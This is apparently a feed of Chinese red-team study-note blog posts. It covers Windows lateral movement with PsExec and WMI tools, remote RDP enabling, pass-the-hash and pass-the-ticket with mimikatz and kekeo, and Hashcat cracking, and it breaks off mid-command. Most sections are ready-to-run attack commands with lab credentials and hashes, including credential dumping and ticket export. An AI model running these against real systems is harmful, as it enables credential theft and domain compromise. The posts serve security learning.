    <content type="html"><![CDATA[<h2 id="1、PsExec"><a href="#1、PsExec" class="headerlink" title="1、PsExec"></a>1、PsExec</h2><h3 id="PsExec-exe"><a href="#PsExec-exe" class="headerlink" title="PsExec.exe"></a>PsExec.exe</h3><p>PsExec 在之前的文章里提到过一次，参见<a href="https://teamssix.com/210802-181052.html">https://teamssix.com/210802-181052.html</a>，今天来着重学习一下。</p><p>PsExec 是 PSTools 工具包里的一部分，其下载地址为：<a href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p><p>利用 PsExec 可以在远程计算机上执行命令，其基本原理是通过管道在远程目标主机上创建一个 psexec 服务，并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件，然后通过 psexec 服务运行命令，运行结束后删除服务。</p><p>建立 ipc$ 连接</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator或者net use \\192.168.7.7 &#x2F;u:teamssix.com\administrator &quot;1qaz@WSX&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在已经建立 ipc$ 的情况下，执行以下命令就可以获得 system 权限</p><pre class="line-numbers language-none"><code class="language-none">PsExec.exe -accepteula \\192.168.7.7 -s cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-accepteula 第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框-s 以 System 权限运行远程进程，如果不用这个参数，就会获得一个对应用户权限的 shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902092309.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>如果没有建立 ipc$ 连接，也可以直接使用 PsExec 指定用户名密码进行连接</p><pre class="line-numbers language-none"><code class="language-none">PsExec.exe \\192.168.7.7 -u administrator -p 1qaz@WSX cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-u 域\用户名-p 密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或者执行以下命令直接回显命令结果</p><pre class="line-numbers language-none"><code class="language-none">PsExec.exe \\192.168.7.7 -u administrator -p 1qaz@WSX cmd.exe &#x2F;c &quot;ipconfig&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在使用 PsExec 时需要注意以下几点：</p><ul><li>需要远程系统开启 admin$ 共享（默认是开启的）</li><li>因为 PsExec 连接的原理是基于 IPC 共享，因此目标需要开放 445 端口</li><li>在使用 IPC$ 连接目标系统后，不需要输入账户和密码。</li><li>在使用 PsExec 执行远程命令时，会在目标系统中创建一个 psexec 的服务，命令执行完后，psexec 服务将被自动删除。由于创建或删除服务时会产生大量的日志，因此蓝队在溯源时可以通过日志反推攻击流程。</li><li>使用 PsExec 可以直接获得 System 权限的交互式 Shell 的前提目标是 administrator 权限的 shell</li><li>在域环境测试时发现，非域用户无法利用内存中的票据使用 PsExec 功能，只能依靠账号和密码进行传递。</li></ul><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>MSF 中也有 PsExec 的利用模块，使用方法如下：</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;psexecset rhost 192.168.7.7set smbuser administratorset smbpass 1qaz@WSXrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、WMI"><a href="#2、WMI" class="headerlink" title="2、WMI"></a>2、WMI</h2><p>WMI 全称 Windows Management Instrumentation 即 Windows 管理工具，Windows 98 以后的操作系统都支持 WMI。</p><p>由于 Windows 默认不会将 WMI 的操作记录在日志里，同时现在越来越多的杀软将 PsExec 加入了黑名单，因此 WMI 比 PsExec 隐蔽性要更好一些。</p><h3 id="wmic-命令"><a href="#wmic-命令" class="headerlink" title="wmic 命令"></a>wmic 命令</h3><p>WMI 连接远程主机，并使用目标系统的 cmd.exe 执行命令，将执行结果保存在目标主机 C 盘的 ip.txt 文件中</p><blockquote><p>使用 WMIC 连接远程主机，需要目标主机开放 135 和 445 端口( 135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤445端⼝传回显)</p></blockquote><pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX process call create &quot;cmd.exe &#x2F;c ipconfig &gt; c:\ip.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后建立 IPC$ ，使用 type 读取执行结果</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administratortype \\192.168.7.7\C$\ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902112523.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>也可以预先建立 ipc$ 连接，再使用 wmic</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administratorwmic &#x2F;node:192.168.7.7 process call create &quot;cmd.exe &#x2F;c ipconfig &gt;c:\ip.txt&quot;type \\192.168.7.7\C$\ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h3><p>在 impacket 工具包里有 wmiexec.py 脚本，可以用来直接获取 shell</p><pre class="line-numbers language-none"><code class="language-none">python3 wmiexec.py administrator:1qaz@WSX@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902113920.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>wmiexec.py 还支持通过哈希传递获得 shell</p><pre class="line-numbers language-none"><code class="language-none">python3 wmiexec.py -hashes LMHash:NTHash 域名&#x2F;用户名@目标IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h3><p>wmiexec.vbs 脚本通过 VBS 调用 WMI 来模拟 PsExec 的功能，wmiexec.vbs 下载地址：<a href="https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs">https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs</a></p><pre class="line-numbers language-none"><code class="language-none">cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.7.7 administrator 1qaz@WSX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902122716.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>使用 vmiexec.vbs 执行单条命令</p><pre class="line-numbers language-none"><code class="language-none">cscript wmiexec.vbs &#x2F;cmd 192.168.7.7 administrator 1qaz@WSX &quot;ipconfig&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为这只是个半交互式的 Shell，因此对于运行时间比较长的命令，比如 ping、systeminfo 等，需要加上 -wait 5000 或更长的时间。</p><p>在运行 nc 等不需要输出结果但需要一直运行的进程时，可以使用 -persist 参数，当命令加了 -persist 选项后，程序会在后台运行，不会有结果输出，而且会返回这个命令进程的 PID，方便结束进程，这样就可以运行 nc 或者木马程序了。</p><p>不过目前 vmiexec.vbs 已经被卡巴斯基、赛门铁克等杀软列入查杀名单了。</p><h3 id="Invoke-WmiCommand"><a href="#Invoke-WmiCommand" class="headerlink" title="Invoke-WmiCommand"></a>Invoke-WmiCommand</h3><p>Invoke-WmiCommand.ps1 是 PowerSploit 工具包里的一部分，该脚本是利用 Powershell 调用 WMI 来远程执行命令。</p><p>在 Powershell 中运行以下命令</p><pre class="line-numbers language-none"><code class="language-none"># 导入 Invoke-WmiCommand.ps1 脚本Import-Module .\Invoke-WmiCommand.ps1# 指定目标系统用户名$User &#x3D; &quot;teamssix.com\administrator&quot; # 指定目标系统的密码$Password &#x3D; ConvertTo-SecureString -String &quot;1qaz@WSX&quot; -AsPlainText -Force# 将账号和密码整合起来，以便导入 Credential$Cred &#x3D; New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password# 指定要执行的命令和目标 IP$Remote &#x3D; Invoke-WmiCommand -Payload &#123;ipconfig&#125; -Credential $Cred -ComputerName 192.168.7.7# 将执行结果输出到屏幕上$Remote.PayloadOutput<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902130614.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="Invoke-WMIMethod"><a href="#Invoke-WMIMethod" class="headerlink" title="Invoke-WMIMethod"></a>Invoke-WMIMethod</h3><p>Invoke-WMIMethod 是 PowerShell 自带的一个模块，也可以用它来连接远程计算机执行命令和指定程序。</p><pre class="line-numbers language-none"><code class="language-none"># 指定目标系统用户名$User&#x3D;&quot;teamssix.com\administrator&quot;# 指定目标系统密码$Password&#x3D;ConvertTo-SecureString -String &quot;1qaz@WSX&quot; -AsPlainText -Force# 将账号和密码整合起来，以便导入 Credential中$Cred&#x3D;New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password# 在远程系统中运行 calc.exe 命令Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;192.168.7.7&quot; -Credential $Cred<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902131658.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看到在 192.168.7.7 主机中已经有进程 ID 为 3276 的 calc.exe 被执行了。</p><h3 id="wmic-的其他命令"><a href="#wmic-的其他命令" class="headerlink" title="wmic 的其他命令"></a>wmic 的其他命令</h3><p>使用 wmic 远程开启目标的 RDP</p><pre class="line-numbers language-none"><code class="language-none"># 适于 Windows xp、server 2003wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX PATH win32_terminalservicesetting WHERE (__Class!&#x3D;&quot;&quot;) CALL SetAllowTSConnections 1# 适于 Windows 7、8、10，server 2008、2012、2016，注意 ServerName 需要改为目标的 hostnamewmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX RDTOGGLE WHERE ServerName&#x3D;&#39;dc&#39; call SetAllowTSConnections 1或者wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX process call create &#39;cmd.exe &#x2F;c REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>判断 RDP 有没有开可以使用以下命令，如果返回 0 表示开启，返回 1 表示关闭。</p><pre class="line-numbers language-none"><code class="language-none">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902135523.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>使用 wmic 远程重启目标计算机</p><pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX process call create &quot;shutdown.exe -r -f -t 0&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p> 参考文章：</p><p> <a href="https://cloud.tencent.com/developer/article/1752180">https://cloud.tencent.com/developer/article/1752180</a></p><p> <a href="https://www.freebuf.com/articles/246440.html">https://www.freebuf.com/articles/246440.html</a></p><p> 更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、PsExec&quot;&gt;&lt;a href=&quot;#1、PsExec&quot; class=&quot;headerlink&quot; title=&quot;1、PsExec&quot;&gt;&lt;/a&gt;1、PsExec&lt;/h2&gt;&lt;h3 id=&quot;PsExec-exe&quot;&gt;&lt;a href=&quot;#PsExec-exe&quot; class=&quot;</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】21、哈希传递与票据传递</title>
    <link href="https://www.teamssix.com/210901-160349.html"/>
    <id>https://www.teamssix.com/210901-160349.html</id>
    <published>2021-09-01T08:03:49.000Z</published>
    <updated>2021-09-01T08:06:50.018Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、哈希传递"><a href="#1、哈希传递" class="headerlink" title="1、哈希传递"></a>1、哈希传递</h2><p>哈希传递（Pass The Hash, PTH）顾名思义，就是利用哈希去登录内网中的其他机器，而不是通过明文密码登录的方式。</p><p>通过哈希传递，攻击者不需要花时间破解哈希值得到明文，在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，因此此时往往会使用工具将哈希值传递到其他计算机中进行登录验证。</p><h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><p>在目标主机上使用 mimikatz 获取 NTLM Hash</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在远程主机上以管理员权限打开 mimikatz</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::pth &#x2F;user:administrator &#x2F;domain:teamssix.com &#x2F;ntlm:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210901120511.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>mimikatz 执行后，会弹出一个拥有对应 Hash 用户权限的 CMD 窗口。</p><h3 id="AES-256-密钥"><a href="#AES-256-密钥" class="headerlink" title="AES-256 密钥"></a>AES-256 密钥</h3><p>使用 mimikatz 抓取密钥</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::ekeys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在其他远程计算机中，以管理员权限打开 mimikatz</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::pth &#x2F;user:administrator &#x2F;domain:teamssix.com &#x2F;aes256:7358fb65149672d99b8c9f3dfd0dfeb486b78268e9c5250b23aefbd26f293c60<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里需要目标机器上安装 KB2871997 补丁，补丁下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=42722">https://www.microsoft.com/en-us/download/details.aspx?id=42722</a></p><p>将该补丁安装后，就可以通过 AES256 密钥进行哈希传递了。</p><p>除了 AES256 外还有 AES128 等，不过平时基本都是使用 NTLM 哈希进行传递。</p><h2 id="2、票据传递"><a href="#2、票据传递" class="headerlink" title="2、票据传递"></a>2、票据传递</h2><p>票据传递（Pass The Ticket, PTT），是基于Kerberos认证的一种攻击方式，这里主要学习票据传递在 mimikatz 和 kekeo 两个工具里的使用。</p><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>使用 mimikatz 可以将内存中的票据进行导出。</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::tickets &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>执行该命令后，会在当前目录下生成多个服务的票据文件，例如 kirbi 等</p><p>使用以下命令可以清除内存中的票据</p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将票据文件注入内存</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptt &quot;[0;4beae]-2-0-40e00000-Administrator@krbtgt-TEAMSSIX.COM.kirbi&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在当前终端下退出 mimikatz ，然后就可以列出目标目录了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210901153402.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>票据传递除了用 mimikatz 还可以用 kekeo</p><h3 id="kekeo"><a href="#kekeo" class="headerlink" title="kekeo"></a>kekeo</h3><p>kekeo 需要使用域名、用户名、NTLM HASH 生成票据，然后再将票据导入，从而连接远程计算机。</p><pre class="line-numbers language-none"><code class="language-none">tgt::ask &#x2F;user:administrator &#x2F;domain:teamssix.com &#x2F;ntlm:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210901154851.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在 kekeo 中清楚当前内存中的其他票据，不然可能会导致票据传递失败</p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Windows 命令行中也可以执行系统自带的命令进行内存中的票据清除</p><pre class="line-numbers language-none"><code class="language-none">klist purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用以下命令将票据导入内存，之后 exit 退出 kekeo，使用 dir 命令就可以列出远程文件了。</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptt &quot;TGT_administrator@TEAMSSIX.COM_krbtgt~teamssix.com@TEAMSSIX.COM.kirbi&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210901155501.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>注意点：</p><p>1、票据文件注入内存的默认有效时间为 10 小时</p><p>2、在目标机器上不需要本地管理员权限就可以进行票据传递</p><p>3、使用票据传递时，dir 命令必须使用主机名，如果使用 IP 地址会提示拒绝访问。</p><blockquote><p>参考文章：</p><p><a href="https://www.cnblogs.com/Xy--1/p/13216686.html">https://www.cnblogs.com/Xy–1/p/13216686.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、哈希传递&quot;&gt;&lt;a href=&quot;#1、哈希传递&quot; class=&quot;headerlink&quot; title=&quot;1、哈希传递&quot;&gt;&lt;/a&gt;1、哈希传递&lt;/h2&gt;&lt;p&gt;哈希传递（Pass The Hash, PTH）顾名思义，就是利用哈希去登录内网中的其他机器，而不是通过明文</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】20、Hashcat 的使用</title>
    <link href="https://www.teamssix.com/210831-122611.html"/>
    <id>https://www.teamssix.com/210831-122611.html</id>
    <published>2021-08-31T04:26:11.000Z</published>
    <updated>2021-08-31T05:38:04.606Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>Hashcat 是一款用于破解密码的工具，据说是世界上最快最高级的密码破解工具，支持 LM 哈希、MD5、SHA 等系列的密码破解，同时也支持 Linux、Mac、Windows 平台。</p><p>工具地址：<a href="https://hashcat.net/">https://hashcat.net</a></p><p>项目地址：<a href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a></p><h2 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h2><h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><p>Mac 用户直接使用 brew 安装即可</p><pre class="line-numbers language-none"><code class="language-none">brew install hashcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>对于 Debain 的 Linux，比如 Kali、Ubuntu 可以直接使用 apt 进行安装</p><pre class="line-numbers language-none"><code class="language-none">apt install hashcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者下载官方二进制文件进行安装</p><p>在 <a href="https://github.com/hashcat/hashcat/releases">https://github.com/hashcat/hashcat/releases</a> 里下载最新版压缩包，这里以 6.2.4 版为例</p><pre class="line-numbers language-none"><code class="language-none">tar zxvf hashcat-6.2.4.7zcd hashcat-6.2.4chmod +x hashcat.bin.&#x2F;hashcat.bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>在 <a href="https://github.com/hashcat/hashcat/releases">https://github.com/hashcat/hashcat/releases</a> 里下载最新版压缩包，解压后可以看到 hashcat.exe</p><h2 id="3、使用"><a href="#3、使用" class="headerlink" title="3、使用"></a>3、使用</h2><p>常用参数：</p><pre class="line-numbers language-none"><code class="language-none">-r使用自定义破解规则-o指定破解成功后的 hash 及所对应的明文密码的存放位置-m指定要破解的 hash 类型，如果不指定类型，则默认是 MD5-a指定要使用的破解模式，其值参考后面对参数。“-a 0” 字典攻击，“-a 1” 组合攻击；“-a 3” 掩码攻击-D指定 opencl 的设备类型--show显示已经破解的 hash 及该 hash 所对应的明文--force忽略破解过程中的警告信息,跑单条 hash 可能需要加上此选项--remove删除已被破解成功的 hash--username忽略 hash 文件中的指定的用户名,在破解 linux 系统用户密码 hash 可能会用到--increment启用增量破解模式,你可以利用此模式让 hashcat 在指定的密码长度范围内执行破解过程--increment-min密码最小长度,后面直接等于一个整数即可,配置 increment 模式一起使用--increment-max密码最大长度,同上--outfile-format指定破解结果的输出格式 id ,默认是 3--self-test-disable    关闭启动自检<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>-a 破解模式：</p><pre class="line-numbers language-none"><code class="language-none">0 | Straight（字段破解）1 | Combination    （组合破解）3 | Brute-force    （掩码暴力破解）6 | Hybrid Wordlist + Mask（字典+掩码破解）7 | Hybrid Mask + Wordlist（掩码+字典破解）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>-D 指定设备类型</p><pre class="line-numbers language-none"><code class="language-none">1 | CPU2 | GPU3 | FPGA, DSP, Co-Processor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>一般使用 -D 2 指定 GPU 破解</p><p>掩码设置：</p><pre class="line-numbers language-none"><code class="language-none">l | abcdefghijklmnopqrstuvwxyz纯小写字母u | ABCDEFGHIJKLMNOPQRSTUVWXYZ纯大写字母d | 0123456789纯数字h | 0123456789abcdef十六进制小写字母和数字H | 0123456789ABCDEF    十六进制大写字母和数字s |  !&quot;#$%&amp;&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\]^_&#96;&#123;|&#125;~    特殊字符a | ?l?u?d?s键盘上所有可见的字符b | 0x00 - 0xff匹配密码空格<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>掩码设置举例：</p><pre class="line-numbers language-none"><code class="language-none">八位数字密码：?d?d?d?d?d?d?d?d八位未知密码：?a?a?a?a?a?a?a?a前四位为大写字母，后面四位为数字：?u?u?u?u?d?d?d?d前四位为数字或者是小写字母，后四位为大写字母或者数字：?h?h?h?h?H?H?H?H前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a6-8位数字密码：--increment --increment-min 6 --increment-max 8 ?d?d?d?d?d?d?d?d6-8位数字+小写字母密码：--increment --increment-min 6 --increment-max 8 ?h?h?h?h?h?h?h?h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>自定义掩码规则：</p><pre class="line-numbers language-none"><code class="language-none">--custom-charset1 [chars]等价于 -1--custom-charset2 [chars]等价于 -2--custom-charset3 [chars]等价于 -3--custom-charset4 [chars]等价于 -4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在掩码中用 ?1、?2、?3、?4 来表示</p><p>注意：</p><ul><li>–custom-charset1 abcd ?1?1?1?1?1 等价于 -1 abcd ?1?1?1?1?1</li><li>-3 abcdef -4 123456 ?3?3?3?3?4?4?4?4 表示前四位可能是 adbcdef，后四位可能是 123456</li></ul><p>另外 Hash 模式与 ID 的对照表由于太长，这里就不放了，可以直接 hashcat -h 进行查看</p><h2 id="4、示例"><a href="#4、示例" class="headerlink" title="4、示例"></a>4、示例</h2><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>密码为 8 位数字</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 --force d54d1702ad0f8326224b817c796763c9 ?d?d?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>密码为 4 位小写字母+数字</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 --force 4575621b0d88c303998e63fc74d165b0 -1 ?l?d ?1?1?1?1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>密码为 1-4 位大写字母+数字</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 --force 8fb5a3e7338ce951971d69be27fc5210 -1 ?u?d ?1?1?1?1 --increment --increment-min 1 --increment-max 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>指定特定字符集：123456abcdf!@+- 进行破解</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于在终端里可能会把部分字符识别为特殊字符，因此需要转义一下</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -1 123456abcdf\!\@+- 8b78ba5089b11326290bc15cf0b9a07d 